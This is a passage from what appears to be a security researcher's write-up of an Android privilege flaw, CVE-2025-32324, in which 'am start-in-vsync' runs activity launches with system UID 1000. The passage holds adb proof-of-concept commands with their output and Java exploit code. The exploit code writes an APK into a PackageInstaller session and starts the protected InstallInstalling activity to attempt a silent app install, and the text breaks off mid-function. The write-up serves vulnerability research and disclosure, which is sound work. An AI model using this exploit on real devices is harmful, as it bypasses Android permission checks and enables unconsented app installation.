</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// this call happens in a different thread context!</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// binder auth info from original caller is lost here</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>startResult</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>runStartActivity</span><span class=p>(</span><span class=n>pw</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>waiter</span><span class=p>.</span><span class=na>onFinished</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=cm>/* extras */</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>getErrPrintWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=s>&#34;Error: unable to start activity, &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>ex</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>USER_OPERATION_TIMEOUT_MS</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>waiter</span><span class=p>.</span><span class=na>waitForFinish</span><span class=p>(</span><span class=n>USER_OPERATION_TIMEOUT_MS</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>startResult</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>;</span><span class=w>  </span><span class=c1>// return whatever happened in that other thread</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>The crucial difference between <code>start-activity</code> and <code>start-in-vsync</code> becomes apparent when you examine the execution flow. While <code>start-activity</code> executes <code>runStartActivity</code> directly in the current thread, <code>start-in-vsync</code> delegates this execution to ATMS&rsquo;s <code>mUiHandler</code> thread via a frame callback.</p><p>Here&rsquo;s where the magic (and the bug) happens: when Android&rsquo;s Handler mechanism transfers execution between threads, the Binder authentication context doesn&rsquo;t follow along. This means that <code>runStartActivity</code> executed in the UI handler thread sees the authentication credentials of the <code>system_server</code> process (UID 1000) rather than the original caller.</p><p>I verified this behavior by adding some debug logging to trace the UID transitions:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// let&#39;s add some debug logging to see what&#39;s really happening</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>case</span><span class=w> </span><span class=s>&#34;start&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>case</span><span class=w> </span><span class=s>&#34;start-activity&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// this should show our shell UID (2000)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>pw</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Direct call - UID: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Binder</span><span class=p>.</span><span class=na>getCallingUid</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;, PID: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Binder</span><span class=p>.</span><span class=na>getCallingPid</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>runStartActivity</span><span class=p>(</span><span class=n>pw</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>case</span><span class=w> </span><span class=s>&#34;start-in-vsync&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>final</span><span class=w> </span><span class=n>ProgressWaiter</span><span class=w> </span><span class=n>waiter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ProgressWaiter</span><span class=p>(</span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=o>[]</span><span class=w> </span><span class=n>startResult</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>int</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>startResult</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mInternal</span><span class=p>.</span><span class=na>mUiHandler</span><span class=p>.</span><span class=na>runWithScissors</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>()</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>Choreographer</span><span class=p>.</span><span class=na>getInstance</span><span class=p>().</span><span class=na>postFrameCallback</span><span class=p>(</span><span class=n>frameTimeNanos</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// watch the magic happen: this will show system_server UID (1000)!</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>pw</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Handler call - UID: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Binder</span><span class=p>.</span><span class=na>getCallingUid</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;, PID: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Binder</span><span class=p>.</span><span class=na>getCallingPid</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>startResult</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>runStartActivity</span><span class=p>(</span><span class=n>pw</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>waiter</span><span class=p>.</span><span class=na>onFinished</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=cm>/* extras */</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>getErrPrintWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=s>&#34;Error: unable to start activity, &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>ex</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>USER_OPERATION_TIMEOUT_MS</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>waiter</span><span class=p>.</span><span class=na>waitForFinish</span><span class=p>(</span><span class=n>USER_OPERATION_TIMEOUT_MS</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>startResult</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=proof-of-concept>Proof of Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h2><p>The authentication bypass becomes crystal clear when you compare the behavior of both commands side by side:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ adb shell am start -n com.android.settings/.SubSettings
</span></span><span class=line><span class=cl>In AMSC.onCommand: <span class=nv>callingUid</span><span class=o>=</span>2000, <span class=nv>callingPid</span><span class=o>=</span><span class=m>3873</span>
</span></span><span class=line><span class=cl>Starting: Intent <span class=o>{</span> <span class=nv>cmp</span><span class=o>=</span>com.android.settings/.SubSettings <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exception occurred <span class=k>while</span> executing <span class=s1>&#39;start&#39;</span>:
</span></span><span class=line><span class=cl>java.lang.SecurityException: Permission Denial: starting Intent <span class=o>{</span> <span class=nv>flg</span><span class=o>=</span>0x10000000 <span class=nv>cmp</span><span class=o>=</span>com.android.settings/.SubSettings <span class=o>}</span> from null <span class=o>(</span><span class=nv>pid</span><span class=o>=</span>3873, <span class=nv>uid</span><span class=o>=</span>2000<span class=o>)</span> not exported from uid <span class=m>1000</span>
</span></span><span class=line><span class=cl>        at com.android.server.wm.ActivityTaskSupervisor.checkStartAnyActivityPermission<span class=o>(</span>ActivityTaskSupervisor.java:1184<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.wm.ActivityStarter.executeRequest<span class=o>(</span>ActivityStarter.java:1223<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.wm.ActivityStarter.execute<span class=o>(</span>ActivityStarter.java:865<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser<span class=o>(</span>ActivityTaskManagerService.java:1321<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser<span class=o>(</span>ActivityTaskManagerService.java:1262<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.am.ActivityManagerService.startActivityAsUserWithFeature<span class=o>(</span>ActivityManagerService.java:3245<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.am.ActivityManagerShellCommand.runStartActivity<span class=o>(</span>ActivityManagerShellCommand.java:869<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.am.ActivityManagerShellCommand.onCommand<span class=o>(</span>ActivityManagerShellCommand.java:251<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.modules.utils.BasicShellCommandHandler.exec<span class=o>(</span>BasicShellCommandHandler.java:97<span class=o>)</span>
</span></span><span class=line><span class=cl>        at android.os.ShellCommand.exec<span class=o>(</span>ShellCommand.java:38<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.am.ActivityManagerService.onShellCommand<span class=o>(</span>ActivityManagerService.java:10406<span class=o>)</span>
</span></span><span class=line><span class=cl>        at android.os.Binder.shellCommand<span class=o>(</span>Binder.java:1143<span class=o>)</span>
</span></span><span class=line><span class=cl>        at android.os.Binder.onTransact<span class=o>(</span>Binder.java:945<span class=o>)</span>
</span></span><span class=line><span class=cl>        at android.app.IActivityManager<span class=nv>$Stub</span>.onTransact<span class=o>(</span>IActivityManager.java:5733<span class=o>)</span>
</span></span><span class=line><span class=cl>        at com.android.server.am.ActivityManagerService.onTransact<span class=o>(</span>ActivityManagerService.java:2721<span class=o>)</span>
</span></span><span class=line><span class=cl>        at android.os.Binder.execTransactInternal<span class=o>(</span>Binder.java:1411<span class=o>)</span>
</span></span><span class=line><span class=cl>        at android.os.Binder.execTransact<span class=o>(</span>Binder.java:1350<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ adb shell am start-in-vsync -n com.android.settings/.SubSettings
</span></span><span class=line><span class=cl>In AMSC.onCommand: <span class=nv>callingUid</span><span class=o>=</span>2000, <span class=nv>callingPid</span><span class=o>=</span><span class=m>3914</span>
</span></span><span class=line><span class=cl>In ATMS.mUiHandler: <span class=nv>callingUid</span><span class=o>=</span>1000, <span class=nv>callingPid</span><span class=o>=</span><span class=m>1306</span>
</span></span><span class=line><span class=cl>Starting: Intent <span class=o>{</span> <span class=nv>cmp</span><span class=o>=</span>com.android.settings/.SubSettings <span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The output speaks for itself: notice how the calling UID changes from 2000 (shell) to 1000 (system) when using <code>start-in-vsync</code>. This UID elevation enables the LaunchAnyWhere attack, as activities that would normally reject our shell-level access now see us as the trusted system server.</p><h2 id=limitations-and-attack-surface>Limitations and Attack Surface<a hidden class=anchor aria-hidden=true href=#limitations-and-attack-surface>#</a></h2><p>While this vulnerability is certainly interesting, it comes with some significant constraints that limit its practical exploitation potential. The most important limitation is that this flaw only exists within the ActivityManagerShellCommand interface. You can&rsquo;t trigger it through standard ATMS Binder IPC calls.</p><p>This means attackers are restricted to using the <code>am</code> command-line utility, which significantly limits the types of parameters that can be passed to target activities. Specifically, you cannot include arbitrary Parcelable objects in the Intent, which rules out many advanced exploitation techniques that rely on complex data structures.</p><p>This parameter restriction is particularly limiting because it prevents chaining this vulnerability with Intent Bridge attacks against third-party applications (UID > 10000) to access their FileProviders, which is a common technique in Android exploitation.</p><h2 id=exploitation-attempts>Exploitation Attempts<a hidden class=anchor aria-hidden=true href=#exploitation-attempts>#</a></h2><h3 id=silent-installation-attack>Silent Installation Attack<a hidden class=anchor aria-hidden=true href=#silent-installation-attack>#</a></h3><p>My first instinct was to weaponize this vulnerability for silent APK installation by targeting the PackageInstaller&rsquo;s <code>InstallInstalling</code> activity. The theory was sound: if I could launch this normally-protected activity with system-level privileges, I might be able to bypass the user confirmation dialogs.</p><p>I crafted the following exploitation approach:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>writeApkToPackageInstaller</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>File</span><span class=w> </span><span class=n>apkFile</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>apkFile</span><span class=p>.</span><span class=na>exists</span><span class=p>()</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>apkFile</span><span class=p>.</span><span class=na>getName</span><span class=p>().</span><span class=na>endsWith</span><span class=p>(</span><span class=s>&#34;.apk&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>e</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Must use an apk file to silent install.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// step 1: create a PackageInstaller session (this part works fine)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PackageInstaller</span><span class=w> </span><span class=n>pi</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>context</span><span class=p>.</span><span class=na>getPackageManager</span><span class=p>().</span><span class=na>getPackageInstaller</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PackageInstaller</span><span class=p>.</span><span class=na>SessionParams</span><span class=w> </span><span class=n>params</span><span class=w> </span><span class=o>=</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>PackageInstaller</span><span class=p>.</span><span class=na>SessionParams</span><span class=p>(</span><span class=n>PackageInstaller</span><span class=p>.</span><span class=na>SessionParams</span><span class=p>.</span><span class=na>MODE_FULL_INSTALL</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>sessionId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pi</span><span class=p>.</span><span class=na>createSession</span><span class=p>(</span><span class=n>params</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PackageInstaller</span><span class=p>.</span><span class=na>Session</span><span class=w> </span><span class=n>session</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pi</span><span class=p>.</span><span class=na>openSession</span><span class=p>(</span><span class=n>sessionId</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// step 2: stream the APK data into the session</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>OutputStream</span><span class=w> </span><span class=n>os</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>session</span><span class=p>.</span><span class=na>openWrite</span><span class=p>(</span><span class=s>&#34;package&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>FileInputStream</span><span class=w> </span><span class=n>fis</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=n>apkFile</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>buffer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>4096</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>n</span><span class=p>;</span><span class=w> </span><span class=p>(</span><span class=n>n</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fis</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=n>buffer</span><span class=p>))</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>;)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>os</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>n</span><span class=p>);</span><span class=w>  </span><span class=c1>// push APK bytes into the installer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>fis</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>os</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>os</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>sessionId</span><span class=p>;</span><span class=w>  </span><span class=c1>// return the session ID for later use</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>exploitCVE_2025_32324</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>sessionId</span><span class=p>,</span><span class=w> </span><span class=n>File</span><span class=w> </span><span class=n>apkFile</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Android</span><span class=p>.</span><span class=na>checkIfSecurityPatchBefore</span><span class=p>(</span><span class=s>&#34;2025-09-01&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>e</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Oops! It looks like CVE-2025-32324 bug has been fixed on this device.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// here&#39;s the magic: use start-in-vsync to bypass activity export restrictions</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=s>&#34;am&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;start-in-vsync&#34;</span><span class=p>,</span><span class=w>  </span><span class=c1>// the vulnerable command that loses auth context</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=s>&#34;-n&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Constants</span><span class=p>.</span><span class=na>Package</span><span class=p>.</span><span class=na>PACKAGE_INSTALLER</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/.InstallInstalling&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=s>&#34;-d&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Uri</span><span class=p>.</span><span class=na>fromFile</span><span class=p>(</span><span class=n>apkFile</span><span class=p>).</span><span class=na>toString</span><span class=p>(),</span><span class=w>  </span><span class=c1>// point to our APK</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=s>&#34;--ei&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;EXTRA_STAGED_SESSION_ID&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Integer</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>sessionId</span><span class=p>),</span><span class=w>  </span><span class=c1>// link to session</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// fire off the exploit and hope for the best</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>p</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>output</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=n>output</span><span class=p>);</span><span class=w>  </span><span class=c1>// see what happens</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>autoInstallFromAsset</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>asset</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
